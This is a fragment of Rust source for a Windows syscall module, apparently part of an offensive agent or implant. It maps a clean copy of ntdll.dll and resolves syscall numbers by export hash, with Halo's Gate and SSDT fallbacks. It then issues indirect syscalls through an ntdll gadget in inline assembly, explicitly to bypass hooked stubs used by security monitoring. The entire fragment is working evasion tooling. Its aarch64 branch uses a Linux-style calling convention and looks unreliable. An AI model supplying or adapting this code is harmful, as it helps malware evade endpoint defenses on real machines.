    let gadget = sys_open.gadget_addr; // use first resolved gadget throughout

    let mut ntdll_path: Vec<u16> = format!(r"\??\{}\System32\ntdll.dll", sysroot)
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
        obj_name.Length = ((ntdll_path.len() - 1) * 2) as u16;
        obj_name.MaximumLength = (ntdll_path.len() * 2) as u16;
        obj_name.Buffer = ntdll_path.as_mut_ptr();

        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length =
            std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut obj_name;
        obj_attr.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

        let mut io_status = [0u64; 2];
        let mut h_file: *mut winapi::ctypes::c_void = std::ptr::null_mut();

        let s = do_syscall(
            sys_open.ssn,
            gadget,
            &[
                &mut h_file as *mut _ as u64,
                0x80100000u64, // SYNCHRONIZE | FILE_READ_DATA
                &mut obj_attr as *mut _ as u64,
                io_status.as_mut_ptr() as u64,
                1u64,  // FILE_SHARE_READ
                0x20u64, // FILE_SYNCHRONOUS_IO_NONALERT
            ],
        );
        if s < 0 {
            return Err(anyhow!("nt_syscall: NtOpenFile(ntdll) NTSTATUS {:#010x}", s as u32));
        }

        let mut h_section: *mut winapi::ctypes::c_void = std::ptr::null_mut();
        let s = do_syscall(
            sys_section.ssn,
            gadget,
            &[
                &mut h_section as *mut _ as u64,
                0x000F_001Fu64, // SECTION_ALL_ACCESS
                0u64,
                0u64,
                0x20u64,       // PAGE_EXECUTE_READ
                0x0100_0000u64, // SEC_IMAGE
                h_file as u64,
            ],
        );
        pe_resolve::close_handle(h_file as *mut core::ffi::c_void);
        if s < 0 {
            return Err(anyhow!("nt_syscall: NtCreateSection(ntdll) NTSTATUS {:#010x}", s as u32));
        }

        let mut base_addr: *mut winapi::ctypes::c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;
        let s = do_syscall(
            sys_map.ssn,
            gadget,
            &[
                h_section as u64,
                (-1isize) as u64, // NtCurrentProcess()
                &mut base_addr as *mut _ as u64,
                0u64,
                0u64,
                0u64,
                &mut view_size as *mut _ as u64,
                1u64, // ViewShare
                0u64,
                0x20u64, // PAGE_EXECUTE_READ
            ],
        );
        pe_resolve::close_handle(h_section as *mut core::ffi::c_void);
        if s < 0 || base_addr.is_null() {
            return Err(anyhow!("nt_syscall: NtMapViewOfSection(ntdll) NTSTATUS {:#010x}", s as u32));
        }

        Ok(base_addr as usize)
    }
}

// ─── Public SSN resolution API ─────────────────────────────────────────────

/// Read the SSN from a named export in the clean-mapped ntdll at `base`.
unsafe fn read_export_ssn(base: usize, func_name: &str) -> anyhow::Result<SyscallTarget> {
    let mut name = func_name.as_bytes().to_vec();
    name.push(0);
    let hash = pe_resolve::hash_str(&name);
    let func_addr = pe_resolve::get_proc_address_by_hash(base, hash)
        .ok_or_else(|| anyhow!("nt_syscall: {} not found in clean ntdll", func_name))?;
    parse_syscall_stub(func_addr)
        .ok_or_else(|| anyhow!("nt_syscall: could not parse SSN for {}", func_name))
}

/// Initialise the syscall infrastructure: map a clean copy of ntdll.dll and
/// warm up the SSN cache.  Safe to call multiple times; subsequent calls are
/// no-ops.
///
/// Returns `Ok(())` on success.  On failure the crate degrades gracefully to
/// bootstrap-mode resolution (Halo's Gate against the loaded ntdll).
pub fn init_syscall_infrastructure() -> anyhow::Result<()> {
    // If cache was dirtied, we need to re-map.  Since OnceLock can't be reset,
    // we skip re-mapping and rely on bootstrap resolution for the rest of
    // this process's lifetime.  The agent's periodic validation will detect
    // any issues.
    if CACHE_DIRTY.load(Ordering::Acquire) {
        CACHE_DIRTY.store(false, Ordering::Release);
        log::debug!("nt_syscall: cache was dirty — clearing flag and attempting re-map");
    }

    match map_clean_ntdll() {
        Ok(base) => {
            // Capture the PE timestamp for cross-reference validation.
            let ts = unsafe { read_pe_timestamp(base) };
            CACHED_TIMESTAMP.store(ts, Ordering::Release);

            let _ = CLEAN_NTDLL.set(base);

            // Also cache the build number while we're at it.
            let _ = get_build_number();

            log::debug!(
                "nt_syscall: clean ntdll mapped at {:#x} (timestamp={:#010x}, build={})",
                base, ts, BUILD_NUMBER.load(Ordering::Acquire)
            );
            Ok(())
        }
        Err(e) => {
            log::warn!("nt_syscall: clean ntdll mapping failed: {e}; falling back to bootstrap mode");
            Err(e)
        }
    }
}

/// Resolve the SSN and gadget address for `func_name`.
///
/// Resolution order:
/// 1. Per-session cache (fast path).
/// 2. Clean-mapped ntdll (if [`init_syscall_infrastructure`] succeeded).
/// 3. Bootstrap / Halo's Gate against the loaded (potentially hooked) ntdll.
pub fn get_syscall_id(func_name: &str) -> anyhow::Result<SyscallTarget> {
    let cache = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));

    // Fast path: check cache.
    if let Some(&(ssn, gadget_addr, _ts)) = cache.lock().unwrap().get(func_name) {
        return Ok(SyscallTarget { ssn, gadget_addr });
    }

    // Resolution order: clean ntdll → bootstrap → SSDT fallback.
    let target = match CLEAN_NTDLL.get().copied().filter(|&b| b != 0) {
        Some(base) => unsafe { read_export_ssn(base, func_name) }?,
        None => get_bootstrap_ssn(func_name)
            .ok_or_else(|| anyhow!("nt_syscall: bootstrap SSN resolution failed for '{func_name}'"))?,
    };

    // Validate against versioned SSN range table.
    let build = get_build_number();
    if build != 0 {
        if let Some((lo, hi)) = expected_ssn_range(func_name, build) {
            if target.ssn < lo || target.ssn > hi {
                log::warn!(
                    "nt_syscall: resolved {} SSN={} is outside expected range [{},{}] for build {}; \
                     attempting SSDT fallback",
                    func_name, target.ssn, lo, hi, build
                );
                // Try SSDT fallback for this specific syscall.
                if let Some(ssdt_target) = unsafe { resolve_via_ssdt(func_name) } {
                    cache.lock().unwrap().insert(
                        func_name.to_string(),
                        (ssdt_target.ssn, ssdt_target.gadget_addr, CACHED_TIMESTAMP.load(Ordering::Acquire)),
                    );
                    return Ok(ssdt_target);
                }
                // SSDT failed too — use what we have but log a warning.
                log::warn!("nt_syscall: SSDT fallback failed; using resolved SSN despite range mismatch");
            }
        }
    }

    cache
        .lock()
        .unwrap()
        .insert(
            func_name.to_string(),
            (target.ssn, target.gadget_addr, CACHED_TIMESTAMP.load(Ordering::Acquire)),
        );
    Ok(target)
}

// ─── Syscall dispatcher ────────────────────────────────────────────────────

/// Dispatch a Windows NT system call directly via the `syscall` instruction,
/// bypassing potentially hooked ntdll stubs.
///
/// # Safety
///
/// All argument values must be valid for the target NT function.  `ssn` and
/// `gadget_addr` must have been obtained from [`get_syscall_id`].
#[doc(hidden)]
#[inline(never)]
pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
    #[cfg(target_arch = "x86_64")]
    {
        let a1 = args.get(0).copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);
        let stack_args: &[u64] = if args.len() > 4 { &args[4..] } else { &[] };
        let nstack: usize = stack_args.len();
        let stack_ptr: *const u64 = stack_args.as_ptr();
        let status: i32;

        core::arch::asm!(
            // Save RSP; restore after the call.
            "mov r14, rsp",
            // Allocate 0x20 shadow space + stack args (8 bytes each), aligned.
            "mov rax, rcx",
            "shl rax, 3",
            "add rax, 0x20 + 15",
            "and rax, -16",
            "sub rsp, rax",
            // Copy stack arguments into [rsp+0x20 .. rsp+0x20 + nstack*8].
            "test rcx, rcx",
            "jz 2f",
            "lea rdi, [rsp + 0x20]",
            "cld",
            "rep movsq",
            "2:",
            // Load syscall arguments and number.
            "mov rcx, {a1}",
            "mov rdx, {a2}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov r11, {gadget}",
            // Indirect syscall: call the `syscall; ret` gadget inside ntdll.
            "call r11",
            // Restore stack.
            "mov rsp, r14",
            ssn    = in(reg) ssn,
            gadget = in(reg) gadget_addr,
            inout("rcx") nstack => _,
            inout("rsi") stack_ptr => _,
            a1 = in(reg) a1,
            a2 = in(reg) a2,
            inlateout("r8")  a3 => _,
            inlateout("r9")  a4 => _,
            lateout("rax") status,
            out("rdx") _, out("r10") _, out("r11") _,
            out("r14") _, out("r15") _,
            out("rdi") _,
        );

        status
    }
    #[cfg(target_arch = "aarch64")]
    {
        let a1 = args.get(0).copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);
        let a5 = args.get(4).copied().unwrap_or(0);
        let a6 = args.get(5).copied().unwrap_or(0);
        let a7 = args.get(6).copied().unwrap_or(0);
        let a8 = args.get(7).copied().unwrap_or(0);
        let status: i32;
        core::arch::asm!(
            "mov x8, {ssn}",
            "mov x0, {a1}",
            "mov x1, {a2}",
            "mov x2, {a3}",
            "mov x3, {a4}",
            "mov x4, {a5}",
            "mov x5, {a6}",
            "mov x6, {a7}",
            "mov x7, {a8}",
            "svc #0",
            ssn = in(reg) ssn as u64,
            a1 = in(reg) a1, a2 = in(reg) a2,
            a3 = in(reg) a3, a4 = in(reg) a4,
            a5 = in(reg) a5, a6 = in(reg) a6,
            a7 = in(reg) a7, a8 = in(reg) a8,
            lateout("x0") status,
            out("x8") _,
        );
        status
    }
    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    {
        let _ = (ssn, gadget_addr, args);
        // Unsupported architecture; return STATUS_NOT_IMPLEMENTED.
        0xC000_0002u32 as i32
    }
}

// ─── Public macro ──────────────────────────────────────────────────────────

/// Dispatch an NT system call by name.
///
/// Resolves the SSN and gadget address via [`get_syscall_id`] (with caching),
/// then calls [`do_syscall`] with the provided arguments cast to `u64`.
///
/// Returns `Result<i32>` — `Ok(ntstatus)` on a successful SSN lookup, or an
/// `Err` if the function name cannot be resolved.  A negative NTSTATUS in the
/// `Ok` variant indicates that the kernel call itself failed; callers should
/// check `result < 0` for NT-level errors.
///
/// # Example
///
/// ```rust,ignore
/// let status = nt_syscall::syscall!(
///     "NtAllocateVirtualMemory",
///     h_process, &mut base as *mut _ as u64,
///     0u64, &mut size as *mut _ as u64,
///     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
/// )?;
/// if status < 0 { return Err(anyhow!("NtAllocateVirtualMemory failed")); }
/// ```
#[macro_export]
macro_rules! syscall {
    ($func_name:expr $(, $args:expr)* $(,)?) => {
        $crate::get_syscall_id($func_name).map(|__target| {
            let __args: &[u64] = &[$($args as u64),*];
            unsafe { $crate::do_syscall(__target.ssn, __target.gadget_addr, __args) }
        })
    };
}
